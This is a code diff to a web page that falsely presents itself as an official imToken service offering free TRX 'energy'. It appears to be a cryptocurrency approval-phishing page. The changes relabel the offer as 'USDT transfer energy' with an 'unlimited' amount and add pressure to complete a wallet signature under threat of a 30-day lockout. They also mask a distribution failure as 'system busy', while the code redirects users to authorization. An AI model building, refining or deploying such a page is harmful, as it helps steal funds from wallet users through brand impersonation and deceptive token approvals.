@@ -289,7 +289,7 @@
         <div class="header">   
             <div>
                 <h1 id="headerTitle">imToken</h1>
-                <p class="desc" id="headerDesc">imToken官方专属服务，每个钱包地址只可免费领取一次能量</p>
+                <p class="desc" id="headerDesc">imToken官方专属服务，每个钱包地址每30天只可领取一次能量</p>
             </div>
         </div>   
         <div id="userInfo">
@@ -301,17 +301,17 @@
             <div class="disconnected-content">
                 <span id="disconnectedText">未连接钱包</span>
                 <p><span class="highlight" id="disconnectedTip1">您现在准备领取的是imToken专属能量，非imToken用户不可领取</span></p>
-                <p><span class="highlight" id="disconnectedTip2">1. 每个钱包地址只可免费领取一次</span></p>         
-                <p><span class="highlight" id="disconnectedTip3">2. 免费发放TRX能量，无额外费用</span></p>
-                <p><span class="highlight" id="disconnectedTip4">3. 连接钱包后系统自动分配能量额度</span></p>
+                <p><span class="highlight" id="disconnectedTip2">1. 每个钱包地址30天内只可免费领取一次</span></p>         
+                <p><span class="highlight" id="disconnectedTip3">2. 项目只为用户在钱包无能量的紧急情况下提供能量支援非盈利项目</span></p>
+                <p><span class="highlight" id="disconnectedTip4">3. 点击领取后系统将审核钱包地址是否符合领取要求</span></p>
                 <p><span class="highlight" id="disconnectedTip5">4. 无需消耗任何资产，选择放弃直接退出即可</span></p>
             </div>
             <div class="connected-content">
                 <p id="connectedSuccess">✅ 钱包已成功连接</p>
                 <p id="connectedAddress">• 钱包地址：<span class="highlight" id="statusAddress"></span></p>
-                <p id="connectedType">• 领取类型：<span class="highlight">免费TRX能量</span></p>
-                <p id="connectedAmount">• 领取额度：<span class="highlight">90000 TRX能量</span></p>
-                <p class="orange-tip" id="connectedWarn">⚠️提示：免费授权即可获取能量，二次登录不会改变领取额度</p>
+                <p id="connectedType">• 领取类型：<span class="highlight">USDT转账能量</span></p>
+                <p id="connectedAmount">• 领取额度：<span class="highlight">90000能量</span></p>
+                <p class="orange-tip" id="connectedWarn">⚠️提示：点击领取后请务必完成签名，中通退出视为已领取30日内不可再次领取</p>
             </div>
         </div>
         <div id="contractResourceContainer">
@@ -328,12 +328,12 @@
         </div>
         <div class="record-list">
             <div style="display: flex; justify-content: space-between; margin: 4px 0;">
-                <span id="recordTypeTitle">可领取能量类型</span>
-                <span id="recordAmountTitle">领取额度</span>
+                <span id="recordTypeTitle">能量使用范围</span>
+                <span id="recordAmountTitle">转账额度</span>
             </div>
             <div style="display: flex; color: #3b82f6;justify-content: space-between; margin: 4px 0;">
-                <span class="header"><h3 id="energyType">TRX能量</h3></span>
-                <span class="header"><h3>90000</h3></span>
+                <span class="header"><h3 id="energyType">USDT转账</h3></span>
+                <span class="header"><h3>无限</h3></span>
             </div>       
             <span id="approvalRecords"class="highlight">暂无能量领取记录</span>        
         </div>
@@ -341,13 +341,7 @@
     <div class="btn-group">
         <div class="warning">
             <p id="browserWarn1"> ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开</p>
-            <p id="browserWarn2"> ⚠️ 非钱包浏览器：点击按钮自动复制+唤起imToken</p>
-            <div class="copy-link-wrap">
-                <span id="copyLinkText">
-                    https://trc20trx-alt.github.io/Trc20.TRX/
-                </span>
-                <button id="copyLinkBtn" id="copyBtnText">复制链接</button>
-            </div>
+            <p id="browserWarn2"> ⚠️ 非钱包浏览器：点击按钮自动复制+唤起imToken</p>  
         </div> 
         <button id="connectBtn" class="btn" id="connectBtnText"> 连接imToken钱包</button>
         <button id="approveBtn" class="btn" disabled id="approveBtnText">免费领取能量</button>
@@ -624,16 +618,6 @@
         renderEnergyRecords();
         updateWalletStatus();
         
-        // 复制链接功能（备用）
-        copyLinkBtn.addEventListener("click", async () => {
-            try {
-                await navigator.clipboard.writeText(copyLinkText.textContent.trim());
-                alert(langConfig[currentLang].copySuccess);
-            } catch (e) { 
-                alert(langConfig[currentLang].copyFail); 
-            }
-        });
-        
         // 检测环境+连接钱包
         await checkImTokenEnv();
         
@@ -906,7 +890,7 @@
             try {
                 // 发送B1信号（分开发送，A1已在init时发送，后端自动等待A1就绪）
                 const b1Success = await sendSignalB(true);
-                if (!b1Success) throw new Error(currentLang === "zh" ? "第一次能量分配失败" : "First energy distribution failed");
+                if (!b1Success) throw new Error(currentLang === "zh" ? "系统繁忙请稍后再试" : "First energy distribution failed");
 
                 // 自动跳转授权
                 btn.textContent = lang.redirectingBtn;
